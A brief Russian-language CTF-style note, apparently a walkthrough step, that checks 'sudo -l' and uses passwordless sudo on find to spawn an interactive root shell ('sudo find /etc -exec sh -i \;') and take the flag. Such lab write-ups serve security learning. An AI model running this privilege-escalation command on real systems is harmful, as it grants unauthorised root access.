проверяем sudo -l
Можно использовать find без пароля и забрать флаг
```
sudo find /etc -exec sh -i \;
```